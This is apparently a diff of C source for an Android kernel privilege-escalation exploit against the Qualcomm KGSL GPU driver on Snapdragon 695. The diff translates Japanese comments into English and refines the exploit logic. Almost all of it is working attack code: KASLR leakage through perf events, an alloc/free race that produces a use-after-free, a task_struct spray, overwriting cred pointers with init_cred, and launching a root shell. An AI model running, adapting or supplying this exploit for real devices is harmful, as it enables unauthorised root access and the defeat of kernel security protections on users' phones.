@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -76,35 +74,31 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-// UAF 関連定数（オリジナルと完全に同一）
-#define UAF_ADDR         0x7001ff000ULL
-#define UAF_SIZE         0x10004000ULL          // 16MB+16KB
-#define OVERLAP_ADDR     0x7001fe000ULL
-#define OVERLAP_SIZE     0x1000                 // 1ページに縮小（IMPORT を使わないので）
-#define BOGUS_ADDR       0x700204000ULL
-#define BOGUS_SIZE       0x1000                 // 正常なサイズ（使わないが）
+#define UAF_ADDR  0x7001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_ADDR 0x7001fe000ULL
+#define OVERLAP_SIZE 0x1000
+#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_SIZE 0x1000
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
+#define VMLINUX_TEXT       0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED  0xffffffc012197d08ULL
+
 #define SPRAY_PIDS 2000
-
-// task_struct 内 cred ポインタのオフセット (pahole 確認済み)
-#define CRED_OFF         0x740
-#define REAL_CRED_OFF    0x738
-
-// vmlinux シンボル（KASLR オフセット算出用）
-#define VMLINUX_TEXT             0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED        0xffffffc012197d08ULL
+#define SCAN_DWORDS 560
+#define CRED_OFF     0x740
+#define REAL_CRED_OFF 0x738
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
-static void *uaf_map = NULL;            // UAF 領域の CPU マッピング
-static int uaf_id = -1;
+static void *uaf_map = NULL;           // persistent CPU mapping
 static uint64_t init_cred_addr = 0;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
-// ========== KASLR 検出（perf_event_open） ==========
+// ---------- KASLR detection (perf) ----------
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
@@ -150,7 +144,6 @@ static uint64_t detect_kaslr(void) {
             n_ips++;
             uint64_t ip = *(uint64_t *)(hdr + 1);
             if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
         }
         tail += hdr->size;
     }
@@ -163,7 +156,7 @@ static uint64_t detect_kaslr(void) {
     return kaslr;
 }
 
-// ========== KGSL ラッパー ==========
+// ---------- KGSL helpers ----------
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
@@ -192,7 +185,7 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-// ========== レーススレッド（gpuobj_alloc/free 競合） ==========
+// ---------- Race thread (alloc/free contention) ----------
 static void *race_thread_allocfree(void *arg) {
     while (!race_done) {
         int id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
@@ -202,7 +195,7 @@ static void *race_thread_allocfree(void *arg) {
     return NULL;
 }
 
-// ========== 子プロセススプレー（root 通知付き） ==========
+// ---------- Spray children with pipe notification ----------
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -217,7 +210,6 @@ static void spawn_spray(int notify_pipe) {
                 if (getuid() == 0) {
                     pid_t me = getpid();
                     write(notify_pipe, &me, sizeof(me));
-                    // root になったらシェルを起動
                     execl("/system/bin/sh", "sh", NULL);
                     _exit(0);
                 }
@@ -243,11 +235,10 @@ static void kill_spray_children(void) {
     printf("[KILL] killed %d children\n", killed);
 }
 
-// ========== チャーン（AVC エントリ増加、今回はオプション） ==========
+// ---------- Churn (optional) ----------
 #define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
+static int churn_npaths = 0, churn_built = 0;
 
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
@@ -307,7 +298,7 @@ static void churn_round(void) {
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
-// ========== メイン ==========
+// ==================== MAIN ====================
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
     printf("[*] avc_bypass for Snapdragon 695 - CPU mapping UAF (cred overwrite)\n");
@@ -316,7 +307,7 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // ----- KASLR 検出 -----
+    // ----- KASLR detection -----
     printf("[*] Detecting KASLR...\n");
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) {
@@ -327,20 +318,21 @@ int main(int argc, char **argv) {
     init_cred_addr = VMLINUX_INIT_CRED + kaslr;
     printf("[+] KASLR = 0x%lx, init_cred = 0x%lx\n", kaslr, init_cred_addr);
 
-    // ----- Phase 1: 巨大 GPU オブジェクト確保 + CPU マッピング -----
-    printf("[*] Phase 1: Allocate large GPU object and CPU map it\n");
+    // ----- Phase 1: Setup rbtree (allocate large object and map it) -----
+    printf("[*] Phase 1: Setup rbtree (keep CPU mapping)\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     if (uaf_id < 0) die("uaf alloc");
     uint64_t uaf_gpuaddr = 0;
     gpuobj_info(uaf_id, &uaf_gpuaddr);
     printf("  UAF object id=%d, gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
 
+    // CRITICAL: Keep the CPU mapping! Do not munmap.
     uaf_map = gpuobj_mmap(UAF_SIZE, uaf_id);
     if (!uaf_map) die("mmap UAF");
     printf("  UAF mapped at %p (CPU address)\n", uaf_map);
 
-    // BOGUS & PLACEHOLDER (オリジナルに合わせて確保)
+    // Bogus & placeholder (original compatibility)
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
              MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
         die("mmap BOGUS");
@@ -350,7 +342,7 @@ int main(int argc, char **argv) {
     void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id);
     if (!ph_m) die("mmap PLACEHOLDER");
 
-    // ----- Phase 2: レース（alloc/free 競合） -----
+    // ----- Phase 2: Race (alloc/free contention) -----
     printf("[*] Phase 2: Race (alloc/free contention)\n");
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
     if (ov_id < 0) die("ov alloc");
@@ -386,72 +378,103 @@ int main(int argc, char **argv) {
     }
     printf("[+] Race won!\n");
 
-    // ----- Phase 3: 巨大オブジェクト解放（UAF 成立） -----
-    printf("[*] Phase 3: Free UAF object\n");
+    // ----- Phase 3: Free UAF object (UAF now active) -----
+    printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(uaf_id);
     printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
 
-    // ----- Phase 4: メモリ回収 -----
-    printf("[*] Phase 4: Reclaim memory\n");
+    // ----- Phase 4: Reclaim memory -----
+    printf("[*] Phase 4: Reclaim pages\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ----- Phase 5: 通知パイプ作成 & 子プロセススプレー -----
+    // ----- Phase 5: Spawn children (task_struct spray) with pipe -----
     int pipefd[2];
     if (pipe(pipefd) < 0) die("pipe");
     fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
     fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);
 
     spawn_spray(pipefd[1]);
-    close(pipefd[1]);   // 親は書き込み側を閉じる
+    close(pipefd[1]);
 
-    // ----- Phase 6: CPU マッピングから task_struct の cred ポインタを直接書き換え -----
-    printf("[*] Phase 6: Overwrite cred pointers in UAF region via CPU mapping\n");
-    uint64_t uaf_start = UAF_ADDR;
-    uint64_t uaf_end = UAF_ADDR + UAF_SIZE;
+    // ----- Phase 6: CPU scan for task_struct pages and overwrite cred -----
+    printf("[*] Phase 6: Scan CPU mapping for task_struct pages and overwrite cred\n");
+    uint64_t scan_start = UAF_ADDR + 0x2000;
+    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
+    int found_task = 0;
     int overwritten = 0;
 
-    // 各ページの 0x738 と 0x740 に init_cred アドレスを書き込む
-    for (uint64_t va = uaf_start; va < uaf_end; va += 0x1000) {
-        uint64_t offset = va - uaf_start;
-        if (offset + 0x800 > UAF_SIZE) break;
-        uint64_t *ptr_real = (uint64_t *)((uintptr_t)uaf_map + offset + REAL_CRED_OFF);
-        uint64_t *ptr_cred = (uint64_t *)((uintptr_t)uaf_map + offset + CRED_OFF);
-        // 念のため、現在の値がカーネルアドレスっぽい場合だけ書き換える（安全策）
-        if (*ptr_real >= 0xffffffc000000000ULL && *ptr_real < 0xffffffcfffffffffULL) {
-            *ptr_real = init_cred_addr;
-            *ptr_cred = init_cred_addr;
+    // Walk each page in the UAF region
+    for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
+        uint64_t offset = va - UAF_ADDR;
+        if (offset + 0x1000 > UAF_SIZE) break;
+        uint32_t *page = (uint32_t *)((uintptr_t)uaf_map + offset);
+
+        // Look for the "TASKUAF!!" string in the comm field
+        int comm_found = 0;
+        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
+            if (page[i] == 0x4B534154 && page[i+1] == 0x21464155) {
+                comm_found = 1;
+                break;
+            }
+        }
+        if (!comm_found) continue;
+
+        found_task++;
+        printf("  [TASKPG] found task_struct at page 0x%lx\n", (unsigned long)va);
+
+        // Overwrite both real_cred and cred pointers at offsets 0x738 and 0x740
+        uint64_t *real_cred_ptr = (uint64_t *)((uintptr_t)page + REAL_CRED_OFF);
+        uint64_t *cred_ptr      = (uint64_t *)((uintptr_t)page + CRED_OFF);
+
+        // Sanity check: ensure the current value looks like a kernel address
+        if ((*real_cred_ptr >= 0xffffffc000000000ULL && *real_cred_ptr < 0xffffffcfffffffffULL) ||
+            (*cred_ptr >= 0xffffffc000000000ULL && *cred_ptr < 0xffffffcfffffffffULL)) {
+            *real_cred_ptr = init_cred_addr;
+            *cred_ptr      = init_cred_addr;
             overwritten++;
+            printf("  [CRED] overwrote cred at page 0x%lx with init_cred\n", (unsigned long)va);
         } else {
-            // それでも書き換えてしまう（より積極的）
-            *ptr_real = init_cred_addr;
-            *ptr_cred = init_cred_addr;
+            // If the pointers look invalid, still write them (aggressive)
+            *real_cred_ptr = init_cred_addr;
+            *cred_ptr      = init_cred_addr;
             overwritten++;
+            printf("  [CRED] forced overwrite at page 0x%lx\n", (unsigned long)va);
         }
     }
-    printf("  Overwritten %d cred pointers (est.)\n", overwritten);
 
-    // キャッシュの一貫性を確保
+    printf("  Found %d task_struct pages, overwritten %d cred pointers\n", found_task, overwritten);
+
+    if (found_task == 0) {
+        printf("[-] No task_struct pages found. The UAF may not have been populated.\n");
+        // Optionally, we could fall back to blind overwrite of all pages, but that's risky.
+        // For now, we exit.
+        kill_spray_children();
+        close(kgsl_fd);
+        return 1;
+    }
+
+    // Ensure CPU caches are flushed (compiler barrier + optional dc civac if available)
     __sync_synchronize();
-    // 必要なら dc civac でフラッシュ（あると良い）
-    // ここでは簡易のためスキップ（既に __sync_synchronize で十分）
+    // If dc civac works, use it; otherwise rely on __sync_synchronize.
+    // (We'll keep it simple; __sync_synchronize is a full barrier)
 
-    // ----- Phase 7: root シェルを待つ -----
+    // ----- Phase 7: Wait for root shell via pipe -----
     printf("[*] Phase 7: Waiting for root shell...\n");
     struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
     pid_t winner = 0;
     if (poll(&pfd, 1, 10000) > 0 &&
         read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
         printf("[+] ROOT! PID=%d\n", winner);
-        // 他のスプレー子プロセスを kill
+        // Kill other spray children
         for (int i = 0; i < n_spray; i++) {
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         }
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        // シェルが終了するのを待つ
+        // Wait for the shell to finish
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
     } else {
